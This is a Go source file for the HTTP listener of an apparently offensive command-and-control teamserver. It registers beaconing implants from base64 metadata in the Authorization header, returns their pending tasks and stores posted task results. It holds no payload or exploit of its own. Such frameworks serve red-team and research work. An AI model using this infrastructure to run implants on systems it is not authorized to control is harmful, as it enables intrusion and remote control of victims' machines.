package listeners

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"strings"
	"sync"
	"time"

	"github.com/gerbsec/G2/teamserver/agents"
)

type HttpListener struct {
	Name     string `json:"name"`
	BindPort string `json:"bindPort"`
	server   *http.Server
	stopChan chan bool
	wg       *sync.WaitGroup
}

var listenersMap = make(map[string]*HttpListener)
var bindPortsMap = make(map[string]bool) // tracks used bind ports

func handleImplant(w http.ResponseWriter, r *http.Request) {
	metadata, err := extractMetadata(r.Header)
	if err != nil {
		http.Error(w, err.Error(), http.StatusNotFound)
		return
	}

	agent := agents.GetServiceInstance().GetAgent(metadata.Id)
	if agent == nil {
		log.Printf("New agent detected with metadata: %+v\n", metadata)
		agent = agents.NewAgent(metadata)
		agents.GetServiceInstance().AddAgent(agent)
		log.Printf("Agent added successfully")
	}
	agent.LastSeen = time.Now().UTC()
	tasks := agent.GetPendingTasks()
	response, _ := json.Marshal(tasks)
	var results []*agents.AgentTaskResult
	if r.Method == "POST" {
		err = json.NewDecoder(r.Body).Decode(&results)
		if err == nil {
			for _, result := range results {
				agent.AddTaskResult(result)
			}
		}
	}
	w.Write(response)
}

func extractMetadata(headers http.Header) (*agents.AgentMetadata, error) {
	encodedMetadataArr, ok := headers["Authorization"]
	if !ok || len(encodedMetadataArr) == 0 {
		return nil, fmt.Errorf("no authorization header found")
	}

	encodedMetadata := encodedMetadataArr[0]
	if len(encodedMetadata) < 7 || !strings.HasPrefix(encodedMetadata, "Bearer ") {
		return nil, fmt.Errorf("malformed authorization header")
	}

	encodedData := encodedMetadata[7:]

	decodedBytes, err := base64.StdEncoding.DecodeString(encodedData)
	if err != nil {
		return nil, fmt.Errorf("failed to decode base64: %v", err)
	}

	var metadata agents.AgentMetadata
	err = json.Unmarshal(decodedBytes, &metadata)
	if err != nil {
		return nil, fmt.Errorf("failed to unmarshal JSON: %v", err)
	}

	return &metadata, nil
}

func (s *HttpListener) Start() {
	mux := http.NewServeMux()
	mux.HandleFunc("/", handleImplant)

	s.server = &http.Server{
		Addr:    ":" + s.BindPort,
		Handler: mux,
	}

	go func() {
		fmt.Printf("Starting listener named %s on :%s\n", s.Name, s.BindPort)
		if err := s.server.ListenAndServe(); err != http.ErrServerClosed {
			log.Fatalf("Listener named %s ListenAndServe() error: %v", s.Name, err)
		}
		s.wg.Done()
	}()
}

func (s *HttpListener) Stop() {
	fmt.Printf("Stopping listener named %s on :%s\n", s.Name, s.BindPort)
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()

	if err := s.server.Shutdown(ctx); err != nil {
		log.Printf("Listener named %s forced to shutdown: %v", s.Name, err)
	}
	close(s.stopChan)
}

func CreateListener(name, bindPort string) error {
	if _, Nexists := listenersMap[name]; Nexists {
		return fmt.Errorf("a listener with the name %s already exists", name)
	}

	if bindPortsMap[bindPort] {
		return fmt.Errorf("a listener with the port %s already exists", bindPort)
	}

	l := &HttpListener{
		Name:     name,
		BindPort: bindPort,
		stopChan: make(chan bool),
		wg:       &sync.WaitGroup{},
	}
	l.wg.Add(1)
	listenersMap[name] = l
	bindPortsMap[bindPort] = true // mark bindport as used
	l.Start()
	return nil
}

func GetListenerInfoByName(name string) (*HttpListener, error) {
	if listener, exists := listenersMap[name]; exists {
		return listener, nil
	}
	return nil, fmt.Errorf("No listener found with name: %s", name)
}

func GetAllListenersInfo() []*HttpListener {
	if len(listenersMap) == 0 {
		return []*HttpListener{}
	}

	var infos []*HttpListener
	for _, l := range listenersMap {
		infos = append(infos, l)
	}

	return infos
}

func StopListenerByName(name string) {
	if listener, exists := listenersMap[name]; exists {
		listener.Stop()
		listener.wg.Wait()
		delete(listenersMap, name)
	}
}
